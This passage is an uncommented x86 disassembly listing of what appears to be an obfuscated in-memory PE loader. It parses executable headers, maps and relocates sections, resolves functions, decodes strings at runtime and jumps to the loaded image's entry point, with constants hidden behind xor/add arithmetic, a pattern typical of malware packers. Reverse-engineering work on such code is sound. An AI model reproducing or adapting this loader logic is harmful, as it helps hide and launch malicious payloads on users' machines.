  41853c:	mov    eax,DWORD PTR [ebp-0x20]
  41853f:	mov    ecx,DWORD PTR [ebp-0x20]
  418542:	xor    eax,ecx
  418544:	mov    DWORD PTR [ebp-0x20],eax
  418547:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41854e:	mov    eax,0x9471
  418553:	mov    WORD PTR [ebp+0x20],ax
  418557:	mov    eax,DWORD PTR [ebp+0x8]
  41855a:	test   eax,eax
  41855c:	je     0x4189b7
  418562:	mov    eax,DWORD PTR [ebp+0xc]
  418565:	test   eax,eax
  418567:	je     0x4189b7
  41856d:	mov    eax,DWORD PTR [ebp+0x18]
  418570:	test   eax,eax
  418572:	je     0x4189b7
  418578:	mov    ax,WORD PTR [ebp+0x20]
  41857c:	mov    ecx,0x8a8d
  418581:	xor    ax,cx
  418584:	mov    ecx,0x3b51
  418589:	add    ax,cx
  41858c:	mov    ecx,DWORD PTR [ebp+0x8]
  41858f:	cmp    WORD PTR [ecx],ax
  418592:	jne    0x4189b7
  418598:	mov    eax,DWORD PTR [ebp-0x4]
  41859b:	xor    eax,esi
  41859d:	add    eax,edi
  41859f:	mov    DWORD PTR [ebp-0x30],eax
  4185a2:	mov    eax,DWORD PTR [ebp-0x4]
  4185a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4185a8:	mov    eax,DWORD PTR [ebp+0x8]
  4185ab:	add    eax,DWORD PTR [ecx+0x3c]
  4185ae:	mov    DWORD PTR [ebp+0xc],eax
  4185b1:	mov    eax,DWORD PTR [eax+0x50]
  4185b4:	test   eax,eax
  4185b6:	je     0x4189b7
  4185bc:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  4185c3:	mov    eax,DWORD PTR [ebp-0x2c]
  4185c6:	xor    eax,esi
  4185c8:	add    eax,edi
  4185ca:	mov    DWORD PTR [ebp-0x2c],eax
  4185cd:	mov    eax,DWORD PTR [ebp-0x4]
  4185d0:	mov    eax,DWORD PTR [ebx+0x190]
  4185d6:	mov    ecx,DWORD PTR [eax]
  4185d8:	mov    ecx,DWORD PTR [ecx+0x3c]
  4185db:	add    ecx,DWORD PTR [eax]
  4185dd:	mov    eax,DWORD PTR [ebp-0x4]
  4185e0:	mov    eax,DWORD PTR [ebx+0x18c]
  4185e6:	mov    edx,DWORD PTR [eax]
  4185e8:	mov    DWORD PTR [ebp-0x18],ecx
  4185eb:	mov    DWORD PTR [ebp+0x20],edx
  4185ee:	cmp    edx,edx
  4185f0:	jne    0x418624
  4185f2:	mov    eax,DWORD PTR [ebx+0x1d8]
  4185f8:	lea    edx,[ebp-0x1c]
  4185fb:	push   edx
  4185fc:	mov    edx,DWORD PTR [ebp-0xc]
  4185ff:	xor    edx,esi
  418601:	add    edx,edi
  418603:	push   edx
  418604:	push   DWORD PTR [ecx+0x50]
  418607:	push   DWORD PTR [ebp+0x20]
  41860a:	call   DWORD PTR [eax+0x1c]
  41860d:	mov    eax,DWORD PTR [ebp-0x18]
  418610:	mov    ecx,DWORD PTR [eax+0x54]
  418613:	mov    eax,DWORD PTR [eax+0x50]
  418616:	sub    eax,ecx
  418618:	add    ecx,DWORD PTR [ebp+0x20]
  41861b:	push   ecx
  41861c:	call   0x418fa3
  418621:	mov    edx,DWORD PTR [ebp+0x20]
  418624:	mov    eax,DWORD PTR [ebx+0x194]
  41862a:	mov    DWORD PTR [eax],edx
  41862c:	mov    eax,DWORD PTR [ebp+0xc]
  41862f:	push   DWORD PTR [eax+0x54]
  418632:	push   DWORD PTR [ebp+0x8]
  418635:	push   edx
  418636:	call   0x418e4a
  41863b:	mov    ecx,DWORD PTR [ebp+0x20]
  41863e:	mov    eax,DWORD PTR [ecx+0x3c]
  418641:	add    eax,ecx
  418643:	movzx  ecx,WORD PTR [eax+0x14]
  418647:	lea    ecx,[ecx+eax*1+0x18]
  41864b:	mov    DWORD PTR [ebp+0x18],ecx
  41864e:	mov    ecx,DWORD PTR [ebp-0x4]
  418651:	movzx  edx,WORD PTR [eax+0x6]
  418655:	xor    ecx,esi
  418657:	add    ecx,edi
  418659:	mov    DWORD PTR [ebp+0xc],eax
  41865c:	cmp    edx,ecx
  41865e:	je     0x41870b
  418664:	mov    ecx,DWORD PTR [ebp-0x4]
  418667:	xor    ecx,esi
  418669:	add    ecx,edi
  41866b:	mov    DWORD PTR [ebp-0x8],ecx
  41866e:	mov    ecx,DWORD PTR [ebp-0x24]
  418671:	movzx  edx,WORD PTR [eax+0x6]
  418675:	xor    ecx,esi
  418677:	sub    edx,ecx
  418679:	sub    edx,edi
  41867b:	cmp    DWORD PTR [ebp-0x8],edx
  41867e:	ja     0x41870b
  418684:	mov    edx,DWORD PTR [ebp+0x18]
  418687:	add    edx,0x8
  41868a:	mov    DWORD PTR [ebp+0x18],edx
  41868d:	jmp    0x418692
  41868f:	mov    edx,DWORD PTR [ebp+0x18]
  418692:	mov    eax,DWORD PTR [eax+0x38]
  418695:	lea    ecx,[eax-0x1]
  418698:	mov    DWORD PTR [ebp-0x34],eax
  41869b:	mov    eax,DWORD PTR [edx]
  41869d:	test   ecx,eax
  41869f:	je     0x4186a8
  4186a1:	not    ecx
  4186a3:	and    eax,ecx
  4186a5:	add    eax,DWORD PTR [ebp-0x34]
  4186a8:	mov    ecx,DWORD PTR [edx+0x4]
  4186ab:	add    ecx,DWORD PTR [ebp+0x20]
  4186ae:	push   ecx
  4186af:	call   0x418fa3
  4186b4:	mov    edx,DWORD PTR [ebp-0x4]
  4186b7:	mov    eax,DWORD PTR [ebp+0x18]
  4186ba:	mov    ecx,DWORD PTR [eax+0x8]
  4186bd:	xor    edx,esi
  4186bf:	add    edx,edi
  4186c1:	cmp    ecx,edx
  4186c3:	je     0x4186dc
  4186c5:	push   ecx
  4186c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4186c9:	add    ecx,DWORD PTR [eax+0xc]
  4186cc:	mov    eax,DWORD PTR [eax+0x4]
  4186cf:	add    eax,DWORD PTR [ebp+0x20]
  4186d2:	push   ecx
  4186d3:	push   eax
  4186d4:	call   0x418e4a
  4186d9:	mov    eax,DWORD PTR [ebp+0x18]
  4186dc:	mov    ecx,DWORD PTR [ebp-0x24]
  4186df:	mov    edx,DWORD PTR [ebp-0x8]
  4186e2:	add    eax,0x28
  4186e5:	xor    ecx,esi
  4186e7:	lea    ecx,[edx+ecx*1+0x3272e2]
  4186ee:	mov    edx,DWORD PTR [ebp+0xc]
  4186f1:	mov    DWORD PTR [ebp+0x18],eax
  4186f4:	mov    eax,DWORD PTR [ebp-0x24]
  4186f7:	movzx  edx,WORD PTR [edx+0x6]
  4186fb:	xor    eax,esi
  4186fd:	sub    edx,eax
  4186ff:	mov    eax,DWORD PTR [ebp+0xc]
  418702:	sub    edx,edi
  418704:	mov    DWORD PTR [ebp-0x8],ecx
  418707:	cmp    ecx,edx
  418709:	jbe    0x41868f
  41870b:	mov    edx,DWORD PTR [ebx+0x18c]
  418711:	mov    ecx,DWORD PTR [ebp+0x20]
  418714:	cmp    ecx,DWORD PTR [edx]
  418716:	jne    0x41873f
  418718:	mov    eax,DWORD PTR [ebx+0x1d8]
  41871e:	lea    edx,[ebp-0x1c]
  418721:	push   edx
  418722:	mov    edx,DWORD PTR [ebp-0x10]
  418725:	xor    edx,esi
  418727:	add    edx,edi
  418729:	push   edx
  41872a:	mov    edx,DWORD PTR [ebp-0x18]
  41872d:	push   DWORD PTR [edx+0x54]
  418730:	push   ecx
  418731:	call   DWORD PTR [eax+0x1c]
  418734:	test   eax,eax
  418736:	je     0x4189a8
  41873c:	mov    eax,DWORD PTR [ebp+0xc]
  41873f:	mov    ecx,DWORD PTR [ebx+0x1c8]
  418745:	mov    ecx,DWORD PTR [ecx]
  418747:	xor    ecx,esi
  418749:	add    ecx,edi
  41874b:	je     0x4188d3
  418751:	and    DWORD PTR [ebp-0x28],0x0
  418755:	and    DWORD PTR [ebp+0x8],0x0
  418759:	mov    eax,0xf89c8519
  41875e:	lea    ecx,[eax-0x8]
  418761:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  418768:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41876f:	mov    DWORD PTR [ebp-0x44],eax
  418772:	mov    DWORD PTR [ebp-0x40],ecx
  418775:	mov    DWORD PTR [ebp-0x3c],ecx
  418778:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41877f:	mov    edx,DWORD PTR [ebp+0x8]
  418782:	mov    ecx,0x89b
  418787:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41878c:	mov    edx,0x72e2
  418791:	add    cx,dx
  418794:	mov    edx,DWORD PTR [ebp+0x8]
  418797:	inc    DWORD PTR [ebp+0x8]
  41879a:	cmp    DWORD PTR [ebp+0x8],0x6
  41879e:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  4187a6:	jb     0x41877f
  4187a8:	mov    ecx,0xf89c850b
  4187ad:	mov    DWORD PTR [ebp-0xa4],eax
  4187b3:	mov    DWORD PTR [ebp-0x90],eax
  4187b9:	mov    DWORD PTR [ebp-0x68],eax
  4187bc:	mov    DWORD PTR [ebp-0x64],eax
  4187bf:	lea    eax,[ecx-0x1]
  4187c2:	mov    edx,0xf89c85ff
  4187c7:	mov    DWORD PTR [ebp-0x58],eax
  4187ca:	mov    DWORD PTR [ebp-0x54],eax
  4187cd:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  4187d7:	mov    DWORD PTR [ebp-0xa0],ecx
  4187dd:	mov    DWORD PTR [ebp-0x9c],edx
  4187e3:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  4187ed:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  4187f7:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  418801:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41880b:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  418815:	mov    DWORD PTR [ebp-0x80],ecx
  418818:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41881f:	mov    DWORD PTR [ebp-0x78],edx
  418822:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  418829:	mov    DWORD PTR [ebp-0x70],ecx
  41882c:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  418833:	mov    DWORD PTR [ebp-0x60],ecx
  418836:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41883d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  418844:	xor    eax,eax
  418846:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41884d:	xor    cl,0x9b
  418850:	sub    cl,0x1e
  418853:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41885a:	inc    eax
  41885b:	cmp    eax,0x17
  41885e:	jb     0x418846
  418860:	mov    eax,DWORD PTR [ebx+0x1d8]
  418866:	lea    ecx,[ebp-0xb4]
  41886c:	push   ecx
  41886d:	call   DWORD PTR [eax+0x4]
  418870:	mov    ecx,DWORD PTR [ebx+0x1d8]
  418876:	lea    edx,[ebp-0xcc]
  41887c:	push   edx
  41887d:	push   eax
  41887e:	call   DWORD PTR [ecx+0x8]
  418881:	lea    ecx,[ebp-0x28]
  418884:	push   ecx
  418885:	mov    ecx,DWORD PTR [ebx+0x18c]
  41888b:	push   DWORD PTR [ecx]
  41888d:	call   eax
  41888f:	mov    eax,DWORD PTR [ebp-0x28]
  418892:	test   eax,eax
  418894:	je     0x4188d0
  418896:	mov    DWORD PTR [ebp+0x8],eax
  418899:	jmp    0x4188a5
  41889b:	mov    eax,DWORD PTR [eax]
  41889d:	mov    DWORD PTR [ebp-0x28],eax
  4188a0:	cmp    eax,DWORD PTR [ebp+0x8]
  4188a3:	je     0x4188b2
  4188a5:	mov    edx,DWORD PTR [eax+0x18]
  4188a8:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188ae:	cmp    edx,DWORD PTR [ecx]
  4188b0:	jne    0x41889b
  4188b2:	mov    edx,DWORD PTR [eax+0x18]
  4188b5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188bb:	cmp    edx,DWORD PTR [ecx]
  4188bd:	jne    0x4188d0
  4188bf:	mov    edx,DWORD PTR [ebp-0x18]
  4188c2:	mov    ecx,DWORD PTR [ebx+0x190]
  4188c8:	mov    edx,DWORD PTR [edx+0x28]
  4188cb:	add    edx,DWORD PTR [ecx]
  4188cd:	mov    DWORD PTR [eax+0x1c],edx
  4188d0:	mov    eax,DWORD PTR [ebp+0xc]
  4188d3:	push   ebx
  4188d4:	push   eax
  4188d5:	push   DWORD PTR [ebp+0x20]
  4188d8:	call   0x418082
  4188dd:	test   eax,eax
  4188df:	je     0x4189a8
  4188e5:	push   DWORD PTR [ebp+0xc]
  4188e8:	mov    ecx,ebx
  4188ea:	push   DWORD PTR [ebp+0x20]
  4188ed:	call   0x417fdb
  4188f2:	test   eax,eax
  4188f4:	je     0x4189a8
  4188fa:	mov    eax,DWORD PTR [ebp+0xc]
  4188fd:	mov    edx,DWORD PTR [ebp+0x20]
  418900:	mov    ecx,ebx
  418902:	call   0x417eb4
  418907:	test   eax,eax
  418909:	je     0x4189a8
  41890f:	push   ebx
  418910:	push   DWORD PTR [ebp+0x20]
  418913:	call   0x418365
  418918:	test   eax,eax
  41891a:	je     0x4189a8
  418920:	mov    eax,DWORD PTR [ebx+0x18c]
  418926:	mov    edx,DWORD PTR [ebp+0x20]
  418929:	cmp    edx,DWORD PTR [eax]
  41892b:	jne    0x418947
  41892d:	mov    eax,DWORD PTR [ebx+0x1d8]
  418933:	lea    ecx,[ebp-0x1c]
  418936:	push   ecx
  418937:	push   DWORD PTR [ebp-0x1c]
  41893a:	mov    ecx,DWORD PTR [ebp-0x18]
  41893d:	push   DWORD PTR [ecx+0x54]
  418940:	push   edx
  418941:	call   DWORD PTR [eax+0x1c]
  418944:	mov    edx,DWORD PTR [ebp+0x20]
  418947:	mov    eax,DWORD PTR [ebx+0x1c8]
  41894d:	mov    eax,DWORD PTR [eax]
  41894f:	xor    eax,esi
  418951:	add    eax,edi
  418953:	je     0x41898c
  418955:	mov    ecx,DWORD PTR [ebp+0xc]
  418958:	mov    eax,DWORD PTR [ecx+0x28]
  41895b:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  418962:	mov    esi,DWORD PTR [ebp+0x8]
  418965:	push   DWORD PTR [ebp+0x14]
  418968:	xor    esi,0x89b
  41896e:	push   DWORD PTR [ebp+0x10]
  418971:	add    esi,0x72e2
  418977:	or     WORD PTR [ecx+0x16],si
  41897b:	add    eax,edx
  41897d:	push   edx
  41897e:	call   eax
  418980:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41898a:	jmp    0x418996
  41898c:	mov    eax,DWORD PTR [ebp+0xc]
  41898f:	mov    eax,DWORD PTR [eax+0x28]
  418992:	add    eax,edx
  418994:	call   eax
  418996:	mov    DWORD PTR [ebp-0x8],eax
  418999:	mov    eax,DWORD PTR [ebp-0x8]
  41899c:	mov    ecx,DWORD PTR [ebp+0x1c]
  41899f:	mov    DWORD PTR [ecx],eax
  4189a1:	mov    DWORD PTR [ebp-0x30],0x1
  4189a8:	cmp    DWORD PTR [ebp-0x30],0x0
  4189ac:	jne    0x4189b2
  4189ae:	and    DWORD PTR [ebp+0x20],0x0
  4189b2:	mov    eax,DWORD PTR [ebp+0x20]
  4189b5:	jmp    0x4189b9
  4189b7:	xor    eax,eax
  4189b9:	pop    edi
  4189ba:	pop    esi
  4189bb:	pop    ebx
  4189bc:	leave  
  4189bd:	ret    0x1c
  4189c0:	push   ebp
  4189c1:	mov    ebp,esp
  4189c3:	movzx  edx,WORD PTR [ecx+0x6]
  4189c7:	movzx  eax,WORD PTR [ecx+0x14]
  4189cb:	push   ebx
  4189cc:	push   edi
  4189cd:	xor    edi,edi
  4189cf:	lea    eax,[eax+ecx*1+0x18]
  4189d3:	test   edx,edx
  4189d5:	je     0x4189f6
  4189d7:	mov    ecx,DWORD PTR [eax+0xc]
  4189da:	lea    ebx,[ecx+esi*1]
  4189dd:	cmp    DWORD PTR [ebp+0x8],ebx
  4189e0:	jb     0x4189ee
  4189e2:	mov    ebx,DWORD PTR [eax+0x8]
  4189e5:	add    ebx,ecx
  4189e7:	add    ebx,esi
  4189e9:	cmp    DWORD PTR [ebp+0x8],ebx
  4189ec:	jb     0x4189f8
  4189ee:	add    eax,0x28
  4189f1:	inc    edi
  4189f2:	cmp    edi,edx
  4189f4:	jb     0x4189d7
  4189f6:	xor    eax,eax
  4189f8:	pop    edi
  4189f9:	pop    ebx
  4189fa:	pop    ebp
  4189fb:	ret    0x4
  4189fe:	push   ebp
  4189ff:	mov    ebp,esp
  418a01:	sub    esp,0x34
  418a04:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  418a0b:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418a12:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  418a19:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  418a20:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  418a27:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  418a2e:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  418a35:	mov    DWORD PTR [ebp-0x10],eax
  418a38:	mov    eax,DWORD PTR [ebp+0x8]
  418a3b:	mov    DWORD PTR [ebp-0x14],eax
  418a3e:	mov    eax,DWORD PTR [ebp-0xc]
  418a41:	push   ebx
  418a42:	mov    ecx,0x751089b
  418a47:	xor    eax,ecx
  418a49:	push   esi
  418a4a:	mov    esi,DWORD PTR [ebp-0x10]
  418a4d:	mov    edx,0x3272e2
  418a52:	add    eax,edx
  418a54:	push   edi
  418a55:	cmp    esi,eax
  418a57:	je     0x418c36
  418a5d:	mov    eax,DWORD PTR [ebp-0xc]
  418a60:	mov    esi,DWORD PTR [ebp-0x14]
  418a63:	xor    eax,ecx
  418a65:	add    eax,edx
  418a67:	cmp    esi,eax
  418a69:	je     0x418c36
  418a6f:	mov    eax,DWORD PTR [ebp-0xc]
  418a72:	xor    eax,ecx
  418a74:	add    eax,edx
  418a76:	mov    DWORD PTR [ebp-0x24],eax
  418a79:	mov    eax,DWORD PTR [ebp-0xc]
  418a7c:	xor    eax,ecx
  418a7e:	add    eax,edx
  418a80:	mov    DWORD PTR [ebp-0x28],eax
  418a83:	mov    edi,DWORD PTR [ebp-0x20]
  418a86:	mov    ebx,DWORD PTR [ebp-0x8]
  418a89:	mov    esi,0x89b
  418a8e:	xor    edi,esi
  418a90:	mov    eax,0x72e2
  418a95:	xor    ebx,esi
  418a97:	add    edi,eax
  418a99:	add    ebx,eax
  418a9b:	sub    ebx,edi
  418a9d:	mov    WORD PTR [ebp-0x8],bx
  418aa1:	jmp    0x418b66
  418aa6:	mov    edi,DWORD PTR [ebp-0xc]
  418aa9:	mov    bx,WORD PTR [ebp-0x4]
  418aad:	xor    edi,esi
  418aaf:	add    edi,eax
  418ab1:	cmp    bx,di
  418ab4:	je     0x418ba8
  418aba:	mov    edi,DWORD PTR [ebp-0xc]
  418abd:	mov    ebx,DWORD PTR [ebp+0xc]
  418ac0:	xor    edi,ecx
  418ac2:	add    edi,edx
  418ac4:	cmp    ebx,edi
  418ac6:	mov    di,WORD PTR [ebp-0x4]
  418aca:	mov    bx,WORD PTR [ebp+0x8]
  418ace:	je     0x418b39
  418ad0:	cmp    bx,di
  418ad3:	je     0x418b42
  418ad5:	mov    edi,DWORD PTR [ebp-0x20]
  418ad8:	mov    bx,WORD PTR [ebp+0x8]
  418adc:	xor    edi,esi
  418ade:	add    edi,eax
  418ae0:	cmp    bx,di
  418ae3:	jb     0x418b03
  418ae5:	mov    edi,DWORD PTR [ebp-0x2c]
  418ae8:	mov    bx,WORD PTR [ebp+0x8]
  418aec:	xor    edi,esi
  418aee:	add    edi,eax
  418af0:	cmp    bx,di
  418af3:	ja     0x418b03
  418af5:	movzx  edi,WORD PTR [ebp+0x8]
  418af9:	movzx  ebx,WORD PTR [ebp-0x8]
  418afd:	add    edi,ebx
  418aff:	mov    WORD PTR [ebp+0x8],di
  418b03:	mov    edi,DWORD PTR [ebp-0x20]
  418b06:	mov    bx,WORD PTR [ebp-0x4]
  418b0a:	xor    edi,esi
  418b0c:	add    edi,eax
  418b0e:	cmp    bx,di
  418b11:	jb     0x418b31
  418b13:	mov    edi,DWORD PTR [ebp-0x2c]
  418b16:	mov    bx,WORD PTR [ebp-0x4]
  418b1a:	xor    edi,esi
  418b1c:	add    edi,eax
  418b1e:	cmp    bx,di
  418b21:	ja     0x418b31
  418b23:	movzx  edi,WORD PTR [ebp-0x4]
  418b27:	movzx  ebx,WORD PTR [ebp-0x8]
  418b2b:	add    edi,ebx
  418b2d:	mov    WORD PTR [ebp-0x4],di
  418b31:	mov    di,WORD PTR [ebp-0x4]
  418b35:	mov    bx,WORD PTR [ebp+0x8]
  418b39:	cmp    bx,di
  418b3c:	jne    0x418c36
  418b42:	mov    edi,DWORD PTR [ebp-0x1c]
  418b45:	mov    ebx,DWORD PTR [ebp-0x10]
  418b48:	xor    edi,ecx
  418b4a:	lea    edi,[edi+ebx*1+0x3272e2]
  418b51:	mov    DWORD PTR [ebp-0x10],edi
  418b54:	mov    edi,DWORD PTR [ebp-0x1c]
  418b57:	mov    ebx,DWORD PTR [ebp-0x14]
  418b5a:	xor    edi,ecx
  418b5c:	lea    edi,[edi+ebx*1+0x3272e2]
  418b63:	mov    DWORD PTR [ebp-0x14],edi
  418b66:	mov    edi,DWORD PTR [ebp-0x24]
  418b69:	mov    ebx,DWORD PTR [ebp-0x10]
  418b6c:	mov    di,WORD PTR [ebx+edi*2]
  418b70:	mov    WORD PTR [ebp+0x8],di
  418b74:	mov    edi,DWORD PTR [ebp-0x28]
  418b77:	mov    ebx,DWORD PTR [ebp-0x14]
  418b7a:	mov    di,WORD PTR [ebx+edi*2]
  418b7e:	mov    WORD PTR [ebp-0x4],di
  418b82:	mov    edi,DWORD PTR [ebp-0xc]
  418b85:	mov    bx,WORD PTR [ebp+0x8]
  418b89:	xor    edi,esi
  418b8b:	add    edi,eax
  418b8d:	cmp    bx,di
  418b90:	jne    0x418aa6
  418b96:	mov    eax,DWORD PTR [ebp-0x18]
  418b99:	mov    esi,DWORD PTR [ebp-0xc]
  418b9c:	xor    eax,ecx
  418b9e:	add    eax,edx
  418ba0:	imul   eax,esi
  418ba3:	mov    DWORD PTR [ebp-0xc],eax
  418ba6:	jmp    0x418bba
  418ba8:	mov    eax,DWORD PTR [ebp-0xc]
  418bab:	mov    esi,DWORD PTR [ebp-0x18]
  418bae:	xor    eax,ecx
  418bb0:	lea    eax,[eax+esi*1+0x3272e2]
  418bb7:	mov    DWORD PTR [ebp-0x18],eax
  418bba:	mov    eax,DWORD PTR [ebp-0x24]
  418bbd:	sub    eax,edx
  418bbf:	xor    eax,ecx
  418bc1:	mov    DWORD PTR [ebp-0x30],eax
  418bc4:	mov    eax,DWORD PTR [ebp-0x28]
  418bc7:	sub    eax,edx
  418bc9:	xor    eax,ecx
  418bcb:	mov    DWORD PTR [ebp-0x34],eax
  418bce:	mov    eax,DWORD PTR [ebp-0x34]
  418bd1:	mov    esi,DWORD PTR [ebp-0x1c]
  418bd4:	xor    esi,ecx
  418bd6:	add    esi,edx
  418bd8:	xor    eax,ecx
  418bda:	add    eax,0x3272e2
  418bdf:	imul   esi,eax
  418be2:	mov    eax,DWORD PTR [ebp-0x14]
  418be5:	movzx  eax,WORD PTR [esi+eax*1]
  418be9:	mov    esi,DWORD PTR [ebp-0x30]
  418bec:	mov    edi,DWORD PTR [ebp-0x1c]
  418bef:	xor    esi,ecx
  418bf1:	add    esi,edx
  418bf3:	xor    edi,ecx
  418bf5:	add    edi,edx
  418bf7:	imul   edi,esi
  418bfa:	mov    esi,DWORD PTR [ebp-0x10]
  418bfd:	movzx  esi,WORD PTR [edi+esi*1]
  418c01:	sub    eax,edx
  418c03:	sub    esi,edx
  418c05:	xor    eax,ecx
  418c07:	xor    esi,ecx
  418c09:	cmp    esi,eax
  418c0b:	jne    0x418c36
  418c0d:	mov    eax,DWORD PTR [ebp-0x30]
  418c10:	mov    esi,DWORD PTR [ebp-0x1c]
  418c13:	xor    eax,ecx
  418c15:	add    eax,0x3272e2
  418c1a:	xor    esi,ecx
  418c1c:	add    esi,edx
  418c1e:	imul   esi,eax
  418c21:	mov    eax,DWORD PTR [ebp-0x10]
  418c24:	movzx  eax,WORD PTR [esi+eax*1]
  418c28:	mov    esi,DWORD PTR [ebp-0xc]
  418c2b:	sub    eax,edx
  418c2d:	xor    eax,ecx
  418c2f:	cmp    eax,esi
  418c31:	mov    eax,DWORD PTR [ebp-0xc]
  418c34:	je     0x418c39
  418c36:	mov    eax,DWORD PTR [ebp-0x18]
  418c39:	pop    edi
  418c3a:	xor    eax,ecx
  418c3c:	pop    esi
  418c3d:	add    eax,edx
  418c3f:	pop    ebx
  418c40:	leave  
  418c41:	ret    0x8
  418c44:	push   ebp
  418c45:	mov    ebp,esp
  418c47:	push   ecx
  418c48:	mov    cx,WORD PTR [eax]
  418c4b:	push   esi
  418c4c:	mov    esi,0x3b51
  418c51:	sub    cx,si
  418c54:	mov    esi,0x8a8d
  418c59:	xor    cx,si
  418c5c:	mov    esi,0x4e22
  418c61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418c68:	mov    edx,0xf89c8585
  418c6d:	cmp    cx,si
  418c70:	je     0x418ccf
  418c72:	push   ebx
  418c73:	push   edi
  418c74:	movzx  ecx,cx
  418c77:	mov    edi,0xffcd8d1e
  418c7c:	mov    esi,0x751089b
  418c81:	mov    ebx,0x4f86
  418c86:	cmp    cx,bx
  418c89:	jne    0x418c8e
  418c8b:	mov    DWORD PTR [ebp-0x4],edx
  418c8e:	lea    edx,[edi+0x1]
  418c91:	xor    edx,esi
  418c93:	mov    edi,edx
  418c95:	xor    edi,esi
  418c97:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  418c9f:	mov    ebx,0x3b51
  418ca4:	sub    cx,bx
  418ca7:	mov    ebx,0x8a8d
  418cac:	xor    cx,bx
  418caf:	mov    ebx,0x4e22
  418cb4:	cmp    cx,bx
  418cb7:	jne    0x418c81
  418cb9:	mov    ecx,DWORD PTR [ebp-0x4]
  418cbc:	pop    edi
  418cbd:	pop    ebx
  418cbe:	cmp    ecx,0xf89c8586
  418cc4:	je     0x418ccf
  418cc6:	xor    ecx,esi
  418cc8:	lea    eax,[eax+ecx*2+0x64e5c6]
  418ccf:	pop    esi
  418cd0:	leave  
  418cd1:	ret    
  418cd2:	push   ebp
  418cd3:	mov    ebp,esp
  418cd5:	push   ecx
  418cd6:	push   esi
  418cd7:	push   edi
  418cd8:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418cdf:	mov    esi,0xf89c8585
  418ce4:	call   0x418c44
  418ce9:	mov    edi,eax
  418ceb:	mov    al,BYTE PTR [edi]
  418ced:	add    al,0x8
  418cef:	xor    al,0x74
  418cf1:	cmp    al,0x7c
  418cf3:	je     0x418d56
  418cf5:	mov    eax,edi
  418cf7:	mov    edx,0xffcd8d1e
  418cfc:	mov    ecx,0x751089b
  418d01:	push   ebx
  418d02:	mov    ax,WORD PTR [eax]
  418d05:	mov    ebx,0x3b51
  418d0a:	sub    ax,bx
  418d0d:	mov    ebx,0x8a8d
  418d12:	xor    ax,bx
  418d15:	mov    ebx,0x4e50
  418d1a:	cmp    ax,bx
  418d1d:	jne    0x418d22
  418d1f:	mov    DWORD PTR [ebp-0x4],esi
  418d22:	lea    esi,[edx+0x1]
  418d25:	xor    esi,ecx
  418d27:	mov    edx,esi
  418d29:	xor    edx,ecx
  418d2b:	lea    eax,[edi+edx*2+0x64e5c4]
  418d32:	mov    bl,BYTE PTR [eax]
  418d34:	add    bl,0x8
  418d37:	xor    bl,0x74
  418d3a:	cmp    bl,0x7c
  418d3d:	jne    0x418d02
  418d3f:	mov    eax,DWORD PTR [ebp-0x4]
  418d42:	pop    ebx
  418d43:	cmp    eax,0xf89c8586
  418d48:	je     0x418d56
  418d4a:	xor    eax,ecx
  418d4c:	xor    ecx,ecx
  418d4e:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  418d56:	mov    eax,edi
  418d58:	pop    edi
  418d59:	pop    esi
  418d5a:	leave  
  418d5b:	ret    
  418d5c:	push   ebp
  418d5d:	mov    ebp,esp
  418d5f:	push   ecx
  418d60:	push   esi
  418d61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418d68:	mov    esi,0xf89c8585
  418d6d:	call   0x418c44
  418d72:	mov    cx,WORD PTR [eax]
  418d75:	mov    edx,0x3b51
  418d7a:	sub    cx,dx
  418d7d:	mov    edx,0x8a8d
  418d82:	xor    cx,dx
  418d85:	mov    edx,0x4e22
  418d8a:	cmp    cx,dx
  418d8d:	je     0x418de6
  418d8f:	push   ebx
  418d90:	push   edi
  418d91:	movzx  ecx,cx
  418d94:	mov    edx,0xffcd8d1e
  418d99:	mov    edi,0x751089b
  418d9e:	mov    ebx,0x4e50
  418da3:	cmp    cx,bx
  418da6:	jne    0x418dab
  418da8:	mov    DWORD PTR [ebp-0x4],esi
  418dab:	lea    esi,[edx+0x1]
  418dae:	xor    esi,edi
  418db0:	mov    edx,esi
  418db2:	xor    edx,edi
  418db4:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  418dbc:	mov    ebx,0x3b51
  418dc1:	sub    cx,bx
  418dc4:	mov    ebx,0x8a8d
  418dc9:	xor    cx,bx
  418dcc:	mov    ebx,0x4e22
  418dd1:	cmp    cx,bx
  418dd4:	jne    0x418d9e
  418dd6:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  418ddd:	pop    edi
  418dde:	pop    ebx
  418ddf:	je     0x418de6
  418de1:	xor    eax,eax
  418de3:	inc    eax
  418de4:	jmp    0x418de8
